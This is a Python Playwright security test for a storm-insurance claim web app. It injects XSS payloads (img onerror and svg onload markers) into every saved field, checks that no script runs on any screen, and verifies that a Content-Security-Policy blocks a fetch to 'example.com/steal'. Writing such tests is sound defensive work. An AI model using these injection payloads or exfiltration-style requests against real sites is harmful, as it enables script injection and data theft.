"""Security: booby-trapped text in every saved field must never run, on every screen; the page must not reach other sites."""
import json, sys
from playwright.sync_api import sync_playwright
from helpers import URL, new_page, start_own, fixtures

PAY = 'x"\'><img src=x onerror="window.__xss=(window.__xss||[]).concat(\'HIT\')"><svg onload="window.__xss=(window.__xss||[]).concat(\'SVG\')">'
SKIP = ['id', 'policyId', 'current', 'type', 'tab', 'threat', 'key', 'cov', 'sev', 'windType', 'source', 'at', 'addedAt', 'lockedAt', 'taken', 'receiptAt', 'rid', 'agreedAt', 'lastBackupAt']
INJECT = """([pay, skip]) => {
  const k='stormfile_v4'; const S=JSON.parse(localStorage.getItem(k)); let n=0;
  const walk=o=>{ if(Array.isArray(o)){ o.forEach((v,i)=>{ if(typeof v==='string'){o[i]=v+pay;n++} else walk(v) }); return }
    if(o&&typeof o==='object') for(const key of Object.keys(o)){ const v=o[key]; if(typeof v==='string'&&!skip.includes(key)){o[key]=v+pay;n++} else if(typeof v==='object') walk(v) } };
  walk(S); const P=S.properties[0];
  P.history=[{at:new Date().toISOString(),what:'hist'+pay}]; P.claim.log=[{note:'log'+pay,date:'d'+pay,at:new Date().toISOString()}];
  P.claim.receipts=[{cat:'Lodging'+pay,what:'w'+pay,amt:10,date:'d'+pay,r:'r'+pay,rid:'nope'}];
  P.exterior=[{src:'data:image/png;base64,iVBORw0KGgo='+pay,addedAt:new Date().toISOString(),date:'d'+pay}];
  P.rooms[0].photoData=[{id:'x'+pay,src:'data:image/png;base64,iVBORw0KGgo='+pay,addedAt:new Date().toISOString()}]; P.rooms[0].open=true;
  P.rooms[0].items.push({n:'item'+pay,v:2000,y:2020,r:'r'+pay,rid:'zz'});
  S.fb={who:'a'+pay,confusing:'c'+pay,name:'n'+pay}; S.me={name:'me'+pay,phone:'p'+pay,email:'e'+pay,mail:'m'+pay};
  S.ltExtra='lt'+pay; S.fuNote='fu'+pay; S.renaming=true;
  localStorage.setItem(k,JSON.stringify(S)); return n }"""
out = {}
with sync_playwright() as p:
    b, ctx, pg, errs = new_page(p)
    external = []
    pg.on('request', lambda r: external.append(r.url) if not (r.url.startswith(URL) or r.url.startswith('data:') or r.url.startswith('blob:') or 'fonts.g' in r.url) else None)
    import os
    if not os.environ.get('SEC_SAMPLE'):
        start_own(pg)
        pg.click('nav.tabs button[data-tab=policy]'); pg.click('text=Enter it by hand'); pg.fill('#pf-lim-A', '300000'); pg.fill('#pf-carrier', 'Co'); pg.fill('#pf-renewal', '2027-05-01'); pg.click('#policyForm button[type=submit]'); pg.wait_for_timeout(300)
    out['strings_injected'] = pg.evaluate(INJECT, [PAY, SKIP])
    pg.reload(wait_until='networkidle'); pg.wait_for_timeout(700)
    for t in ['home', 'policy', 'inventory', 'storm', 'claim', 'feedback', 'policyForm', 'settings']:
        pg.evaluate("t=>{ const b=document.querySelector('nav.tabs button[data-tab='+t+']'); if(b) b.click(); else { const x=document.querySelector('[data-go='+t+']'); if(x) x.click(); else { document.getElementById('fbBtn').click(); const y=document.querySelector('[data-go='+t+']'); y&&y.click(); } } }", t)
        pg.wait_for_timeout(300)
    pg.evaluate("()=>document.getElementById('fbBtn').click()"); pg.wait_for_timeout(200)
    pg.evaluate("()=>document.querySelector('nav.tabs button[data-tab=claim]').click()"); pg.wait_for_timeout(200)
    for kind in ['followup', 'estimate', 'status', 'ale', 'supplement', 'policy']:
        try: pg.select_option('#ltKind', kind); pg.wait_for_timeout(150)
        except Exception: pass
    pg.evaluate("()=>{const b=document.querySelector('.phbtn'); b&&b.click()}"); pg.wait_for_timeout(300)
    pg.evaluate("()=>document.getElementById('menuBtn').click()"); pg.wait_for_timeout(200)
    out['script_ran'] = pg.evaluate("()=>window.__xss||[]")
    out['payload_shown_as_text'] = pg.evaluate("()=>document.body.innerText.includes('onerror=')")
    out['csp_present'] = pg.evaluate("()=>!!document.querySelector('meta[http-equiv=Content-Security-Policy]')")
    blocked = pg.evaluate("""async()=>{ try{ await fetch('https://example.com/steal?x=1'); return false }catch(e){ return true } }""")
    out['cannot_send_data_out'] = blocked
    out['external_requests'] = [u for u in external if 'example.com' not in u][:5]
    out['errors'] = [e for e in errs if 'Content Security Policy' not in e and 'example.com' not in e]
    b.close()
ok = not out['script_ran'] and out['payload_shown_as_text'] and out['csp_present'] and out['cannot_send_data_out'] and not out['external_requests'] and not out['errors']
print(json.dumps(out, indent=1)); print('PASS' if ok else 'FAIL'); sys.exit(0 if ok else 1)
